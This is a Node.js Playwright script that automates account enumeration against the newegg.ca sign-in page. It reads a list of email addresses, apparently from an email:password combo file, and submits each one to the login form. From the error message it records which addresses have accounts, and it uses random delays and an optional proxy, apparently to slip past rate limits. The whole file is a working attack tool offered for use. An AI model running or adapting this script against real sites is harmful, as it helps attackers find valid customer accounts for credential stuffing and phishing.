const fs = require('fs');
const { chromium } = require('playwright');

(async () => {
  // Uncomment below to use a proxy if needed
  /*
  const browser = await chromium.launch({
    headless: false,
    proxy: {
      server: 'http://YOUR_PROXY_IP:PORT',
      username: 'YOUR_USERNAME', // Proxy username if required
      password: 'YOUR_PASSWORD', // Proxy password if required
    }
  });
  */

  // Launch browser without proxy (for demo purposes)
  const browser = await chromium.launch({ headless: false });
  const page = await browser.newPage();

  // Load email list from emails.txt
  const lines = fs.readFileSync('emails.txt', 'utf-8').split('\n').filter(Boolean);
  const emails = lines.map(line => line.split(':')[0].trim());

  // Load already checked emails if results exist
  let existingResults = [];
  if (fs.existsSync('results.csv')) {
    existingResults = fs.readFileSync('results.csv', 'utf-8').split('\n').map(line => line.split(',')[0].trim());
  }

  const results = fs.existsSync('results.csv') ? fs.readFileSync('results.csv', 'utf-8').trim().split('\n') : [];
  const foundEmails = fs.existsSync('found.txt') ? fs.readFileSync('found.txt', 'utf-8').trim().split('\n') : [];

  async function goToLoginPage() {
    console.log('🔁 Refreshing login page...');
    await page.goto('https://www.newegg.ca', { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForSelector('a[title="My Account"]', { timeout: 15000 });
    await page.click('a[title="My Account"]');
    await page.waitForURL('**/signin**', { timeout: 15000 });
    await page.waitForSelector('#labeled-input-signEmail', { timeout: 15000 });
  }

  // Go to login page first
  await goToLoginPage();

  for (const email of emails) {
    if (!email || existingResults.includes(email)) {
      console.log(`⏭️ Skipping (already checked): ${email}`);
      continue;
    }

    console.log(`🔍 Checking: ${email}`);

    try {
      await page.fill('#labeled-input-signEmail', '');
      await page.type('#labeled-input-signEmail', email, { delay: 100 });

      await page.click('#signInSubmit');
      await page.waitForTimeout(2500);

      let status = 'UNKNOWN';

      const error = await page.$('p.color-red');
      if (error) {
        const text = await error.textContent();
        if (text.includes("We didn't find any matches")) {
          status = 'NOT FOUND';
        } else {
          status = 'POSSIBLY FOUND';
        }
      } else {
        status = 'FOUND';
      }

      results.push(`${email},${status}`);
      if (status === 'FOUND') {
        foundEmails.push(email);
      }

    } catch (err) {
      console.log(`❌ Error checking ${email}:`, err.message);
      results.push(`${email},ERROR`);
    }

    // Try to refresh login page safely after each email
    try {
      await goToLoginPage();
    } catch (err) {
      console.log('⚠️ Warning: Could not refresh login page, trying to continue...');
    }

    const delay = Math.floor(Math.random() * 1000) + 1000;
    await page.waitForTimeout(delay);
  }

  fs.writeFileSync('results.csv', results.join('\n'));
  fs.writeFileSync('found.txt', foundEmails.join('\n'));

  console.log('✅ Done. Results saved to results.csv and found.txt');
  await browser.close();
})();
